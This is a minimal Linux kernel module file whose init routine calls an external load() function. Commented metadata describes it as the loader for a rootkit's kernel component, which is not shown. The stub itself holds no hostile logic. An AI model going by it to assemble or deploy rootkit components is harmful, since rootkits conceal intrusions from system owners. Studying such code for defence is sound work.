#include <linux/module.h>       /* Needed by all modules */

extern int load(void);

int init_module(void) {
    return load();
}

void cleanup_module(void) {
}

MODULE_LICENSE("GPL");
//MODULE_INFO(intree, "Y");
//MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
//MODULE_DESCRIPTION("This is the loader of the rootkit's kernel (kernel.c).");
